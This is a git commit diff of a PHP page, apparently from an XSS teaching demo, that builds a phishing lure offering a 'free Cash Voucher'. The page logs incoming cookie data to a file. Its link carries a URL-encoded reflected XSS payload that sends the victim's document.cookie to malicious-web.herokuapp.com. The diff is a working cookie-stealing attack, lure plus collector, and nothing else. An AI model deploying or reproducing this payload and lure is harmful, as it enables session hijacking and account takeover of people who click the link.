f77186016f0e976833dd8dabda2c846f761fee1a
Nisat <nisat19@gmail.com>
2022-04-14 14:02:03 +0600

    Initial Cooomit

--- index2.php
+++ index2.php
@@ -1,7 +1,7 @@
 <?php
 
 if(isset($_GET) && $_GET['data']){
-  $myfile = fopen("dumpdata.txt", "w") or die("Unable to open file!");
+  $myfile = fopen("dumpdata.txt", "a") or die("Unable to open file!");
   fwrite($myfile, "\n\n" . date("Y-m-d H:i:s") . " : " .$_GET['data']);
   fclose($myfile);
 }
@@ -20,7 +20,7 @@ if(isset($_GET) && $_GET['data']){
       background-color: #21b26a;
     }
   </style>
-  <title>Get a free juice!</title>
+  <title>Get a free Cash Voucher!</title>
 </head>
 
 <body>
@@ -28,7 +28,7 @@ if(isset($_GET) && $_GET['data']){
     <h1>Winner! Winner!</h1>
     <p> Lucky winner! You won a free cash voucher in your account! Just <a
         href="
-        https://vulnerable-to-hack.herokuapp.com/fixed-web/index.php?search=%3Cimg%20src%3D%22x%22%20onerror%3D%22javascript%3Avar%20xmlHttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0AxmlHttp.open%28%20%27GET%27%2C%20%27https%3A%2F%2Fmalicious-web.herokuapp.com%2Findex.php%3Fdata%3D%27%2Bdocument.cookie%2C%20false%20%29%3B%20xmlHttp.send%28%20null%20%29%3B%22%3E
+        https://vulnerable-to-hack.herokuapp.com/vulnerable-web/index.php?search=%3Cimg%20src%3D%22x%22%20onerror%3D%22javascript%3Avar%20xmlHttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0AxmlHttp.open%28%20%27GET%27%2C%20%27https%3A%2F%2Fmalicious-web.herokuapp.com%2Findex.php%3Fdata%3D%27%2Bdocument.cookie%2C%20false%20%29%3B%20xmlHttp.send%28%20null%20%29%3B%22%3E
         ">click
         here</a> to claim! </p>
   </center>
